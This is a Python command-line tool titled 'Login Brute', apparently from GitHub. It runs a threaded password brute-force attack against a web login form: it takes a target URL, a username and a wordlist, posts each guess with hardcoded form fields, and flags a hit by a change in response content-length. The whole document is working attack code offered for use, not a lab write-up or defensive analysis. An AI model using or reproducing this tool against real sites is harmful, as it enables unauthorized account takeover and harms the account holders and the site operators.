import requests
import threading
from time import sleep

print(
    """
    _                _         ____             _       
   | |    ___   __ _(_)_ __   | __ ) _ __ _   _| |_ ___ 
   | |   / _ \ / _` | | '_ \  |  _ \| '__| | | | __/ _ |  ~>Login Brute<~
   | |__| (_) | (_| | | | | | | |_) | |  | |_| | ||  __/ ~~>Made by tfwcodes(github)<~~
   |_____\___/ \__, |_|_| |_| |____/|_|     \__,_|\__\___|
               |___/                                    
               
    """
)

print("--help for the help menu")
print("--brt to start the bruteforce attack")

while True:
    command_bruteforce = input("[+] Enter a command: ")
    if command_bruteforce == "--help":
        print("[INFO] Before starting the attack you must know the form data of the login page and introduce the form data in the fuction called login and in the variable called r which makes the post request")
        print("[INFO] You will know that the password is right if the content-length is different then the other requests")
    elif command_bruteforce == "--brt":
        def check_website(url):
            try:
                requests.get(url)
                print("[INFO] The url is valid")
            except:
                print("[INFO] The url is invalid")
                input()
                exit()

        count = 0

        def login(user, url, word):
            global count

            s = requests.session()

            r = s.post(url, data={"rcr_authenticate": "1", "rcr_user": user, "rcr_pass": word, "rcr_submit": "Conectare"})
            count +=1

            print("-"*50)
            print("\n" + f"[ATTACK] Attempt: {count} Content-length: {r.headers['content-length']} Password: {word}" + "\n")
            print("-"*50)



        url = input("[+] Enter the target url: ")
        check_website(url)

        target_user = input("[+] Enter the target user: ")
        passlist = input("[+] Enter the password list (must be in the same directory): ")

        passwfile = open(passlist, "r").read()
        passwfile = passwfile.split("\n")


        threads = []

        for word in passwfile:
            t = threading.Thread(target=login, args=(target_user, url, word))
            t.start()
            sleep(0.3)

            threads.append(t)

        for thread in threads:
            thread.join()

    else:
        print(f"Invalid command [{command_bruteforce}]")
